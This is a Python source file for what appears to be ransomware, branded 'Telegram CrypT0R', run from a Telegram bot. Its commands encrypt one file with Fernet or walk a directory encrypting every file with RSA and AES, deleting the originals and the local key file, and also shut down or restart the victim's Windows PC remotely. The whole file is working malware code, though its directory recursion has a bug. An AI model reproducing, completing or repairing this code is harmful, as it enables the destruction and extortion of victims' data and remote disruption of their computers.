from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from Cryptodome.Cipher import AES, PKCS1_OAEP
from os import path, remove, listdir, system
import telebot
from cryptography.fernet import Fernet

input_file = ''   # Файл для шифрования / Input file
output_file = 'file.encrypted'  # Файл который мы получаем на выходе / Output file

key_file = open('key.key', 'rb')  # Открываем файл с ключём для чтения / Open file with key
key = key_file.read()  # Читаем содержимое файла с ключём / Read content of key file
key_file.close()  # Зыкрываем файл с ключём / Close file with key


bot_token = "TOKEN"  # Токен бота / Bot token
chat_id = "ID"  # Ваш айди / Your ID
bot = telebot.TeleBot(bot_token)

bot.send_message(chat_id, "Bot started successfully!")


# ---------------------------------------------------------------------------------------------------------------------


# Initiate command /start
@bot.message_handler(commands=['start', 'Start'])
def start(message):
    bot.send_message(chat_id, "Telegram CrypT0R by F4RB3R" + "\n\nUse /help to see commands")


# Initiate command /help
@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands'])
def send_help(message):
    help_info = r'''
------------------------------
<Welcome to Help>
------------------------------
Bot Commands:
[01] Start
[ /] /start
[02] Help.
[ /] /help
[03] Encrypting one file.
[ /] /encryptingone
[03] Encrypting all data.
[ /] /encryptingall
[04] Shutdown PC.
[ /] /shutdown
[05] Restart PC.
[ /] /restart
------------------------------
<Created by F4RB3R>
------------------------------
'''
    bot.send_message(chat_id, help_info)


# Initiate command /shutdown
@bot.message_handler(commands=["shutdown", "/shutdown", "/Shutdown"])
def shutdown(self):
    bot.send_message(chat_id, "Shutdown Successfully!")
    system("shutdown /s /t 1")  # Выключение компьютера / Shutdown PC


# Initiate command /restart
@bot.message_handler(commands=["restart", "/restart", "/Restart"])
def restart(self):
    bot.send_message(chat_id, "Restart Successfully!")
    system("shutdown /r /t 1")  # Перезагрузка компьютера / Command to reboot PC


# Initiate command /encryptingone
@bot.message_handler(commands=["encryptingone", "/encryptingone"])
def encrypt(self):
    try:
        with open(input_file, 'rb') as f:
            data = f.read()  # Читаем файл / Read the file

        fernet = Fernet(key)  # Переменная с ключём для шифрования / Variable with key for encoding
        encrypted = fernet.encrypt(data)  # Шифруем файл / Encrypting the file

        with open(output_file, 'wb') as f:
            f.write(encrypted)  # Записываем информацию в зашифрованный файл / Write encoded message/file to output file
        remove(input_file)  # Удаляем исходный файл / Removing input file
        remove("key.key")  # Удаляем файл с ключём / Removing key file

    except Exception as ex:
        bot.send_message(chat_id, "Something went wrong!\n" + str(ex))


# Initiate command /encrypt
@bot.message_handler(commands=["encryptingall", "/encryptingall"])
def encrypt(self):
    try:
        def crypt(file):
            f = open(file, "rb")
            data = f.read()
            f.close()

            file_out = open(str(file) + ".bin", "wb")

            recipient_key = RSA.import_key(open('receiver.pem').read())
            session_key = get_random_bytes(16)

            cipher_rsa = PKCS1_OAEP.new(recipient_key)
            enc_session_key = cipher_rsa.encrypt(session_key)

            cipher_aes = AES.new(session_key, AES.MODE_EAX)
            ciphertext, tag = cipher_aes.encrypt_and_digest(data)

            [file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]

            print(file + " Encoded")
            remove(file)

        def walk(dir):
            for name in listdir(dir):
                path_to_file = path.join(dir, name)
                if path.isfile(path_to_file):
                    crypt(path_to_file)
                else:
                    walk(path)

        walk("your_directory")
        bot.send_message(chat_id, "Successfully encrypted")
    except Exception as ex:
        bot.send_message(chat_id, "Something went wrong!\n" + str(ex))
# ---------------------------------------------------------------------------------------------------------------------


bot.polling()


# ---------------------------------------------------------------------------------------------------------------------
